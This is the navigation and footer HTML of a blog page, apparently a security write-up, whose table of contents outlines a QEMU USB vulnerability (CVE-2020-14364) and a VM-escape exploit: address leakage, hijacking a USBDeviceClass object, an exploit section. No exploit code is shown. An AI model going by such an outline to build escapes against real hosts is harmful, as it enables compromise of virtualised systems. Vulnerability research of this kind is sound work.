          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-PCI%E8%AE%BE%E5%A4%87"><span class="nav-number">2.</span> <span class="nav-text">0x02 PCI设备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%93%E6%9E%84"><span class="nav-number">2.1.</span> <span class="nav-text">结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MMIO"><span class="nav-number">2.2.</span> <span class="nav-text">MMIO</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PMIO"><span class="nav-number">2.3.</span> <span class="nav-text">PMIO</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-UHCI-Universal-Host-Controller-Interface"><span class="nav-number">3.</span> <span class="nav-text">0x03 UHCI(Universal Host Controller Interface)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-USB%E6%95%B0%E6%8D%AE%E5%8C%85%E5%A4%84%E7%90%86%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-14364%EF%BC%89"><span class="nav-number">4.</span> <span class="nav-text">0x04 USB数据包处理漏洞（CVE-2020-14364）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E9%BB%91%E7%9B%92%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8"><span class="nav-number">5.</span> <span class="nav-text">0x05 黑盒虚拟机逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">5.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"><span class="nav-number">5.2.</span> <span class="nav-text">地址泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81USBDeviceClass%E5%AF%B9%E8%B1%A1"><span class="nav-number">5.3.</span> <span class="nav-text">劫持USBDeviceClass对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-number">5.4.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E5%8F%82%E8%80%83"><span class="nav-number">6.</span> <span class="nav-text">0x06 参考</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ha1vk</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">234</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">145</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ha1vk</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
